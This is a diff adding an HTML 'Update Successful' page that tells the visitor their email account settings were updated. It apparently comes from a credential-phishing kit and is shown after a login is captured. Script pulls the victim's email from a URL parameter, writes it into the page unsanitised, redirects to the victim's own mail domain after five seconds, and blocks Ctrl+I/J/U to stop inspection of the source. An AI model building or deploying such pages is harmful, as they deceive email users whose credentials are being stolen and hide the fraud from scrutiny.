@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update Successful</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css?family=Raleway:100,200,300,400,500,600,700,800,900&display=swap');
+html,body {
+    font-family: 'Raleway', sans-serif;  
+}
+.thankyou-page ._header {
+    background: #58A809;
+    padding: 100px 30px;
+    text-align: center;
+    
+}
+.thankyou-page ._header .logo {
+    max-width: 50px;
+    margin: 0 auto 50px;
+}
+.thankyou-page ._header .logo img {
+    width: 100%;
+}
+.thankyou-page ._header h1 {
+    font-size: 65px;
+    font-weight: 800;
+    color: white;
+    margin: 0;
+}
+.thankyou-page ._body {
+    margin: -70px 0 30px;
+}
+.thankyou-page ._body ._box {
+    margin: auto;
+    max-width: 80%;
+    padding: 50px;
+    background: white;
+    border-radius: 3px;
+    box-shadow: 0 0 35px rgba(10, 10, 10,0.12);
+    -moz-box-shadow: 0 0 35px rgba(10, 10, 10,0.12);
+    -webkit-box-shadow: 0 0 35px rgba(10, 10, 10,0.12);
+}
+.thankyou-page ._body ._box h2 {
+    font-size: 32px;
+    font-weight: 600;
+    color: #4ab74a;
+}
+.thankyou-page ._footer {
+    text-align: center;
+    padding: 50px 30px;
+}
+
+.thankyou-page ._footer .btn {
+    background: #4ab74a;
+    color: white;
+    border: 0;
+    font-size: 14px;
+    font-weight: 600;
+    border-radius: 0;
+    letter-spacing: 0.8px;
+    padding: 20px 33px;
+    text-transform: uppercase;
+}
+    </style>
+<link href="httpS://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>    
+</head>
+<body>
+    <div class="thankyou-page">
+        <div class="_header">
+            <h1>Successful!</h1>
+            <div class="logo">
+                <img src="https://cdn.glitch.com/e4905575-fbae-45d8-bc6c-e33b4a167082%2Fajax-loader35fd.gif?v=1617145491470" alt="">
+            </div>
+            
+        </div>
+        <div class="_body">
+            <div class="_box">
+                <h2>
+                    <strong>Thank you!</strong> Account settings update on <span id="email_get1"></span> server was successful.
+                </h2>
+                <p>
+                    
+                    <strong>You will be redirected back to your email shortly.</strong> 
+                </p>
+
+            </div>
+        </div>
+        <div class="_footer">
+            <p>Having trouble? <a href="">Contact us</a> </p>
+            <a class="btn" href="">Back to homepage</a>
+        </div>
+    </div>
+
+    <script>
+
+
+        /* global $ */
+        $(document).ready(function(){
+        
+        
+         function getUrlVars() {
+            var vars = {};
+            var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+              vars[key] = value;
+            });
+            return vars;
+          }
+          
+          var number = getUrlVars()["msg"];
+    
+           $("#email_get1").html(number);
+           $("#email_get3").html(number);
+           var my_email =number;
+            var ind=my_email.indexOf("@");
+            var my_slice=my_email.substr((ind+1));
+            var c= my_slice.substr(0, my_slice.indexOf('.'));
+            var final= c.toLowerCase();
+            var domain=final.charAt(0).toUpperCase() + final.slice(1);
+            $("#email_get2").html(my_slice);
+            $("#domain_get0").html(domain);
+            $("#domain_get1").html(domain);
+            $("#domain_get2").html(domain);
+    
+           setTimeout(() => {  window.location.replace("https://www."+my_slice); }, 5000);
+       });
+    
+        document.onkeydown=function(e){
+          if (e.ctrlKey && 
+            (e.keyCode === 73 || 
+             e.keyCode === 105 ||
+             e.keyCode === 74 || 
+             e.keyCode === 106 || 
+             e.keyCode === 85 || 
+             e.keyCode === 117)) {
+            alert('not allowed');
+          return false;
+        } else {
+          return true;
+        }
+      }
+    </script>    
+</body>
+</html>
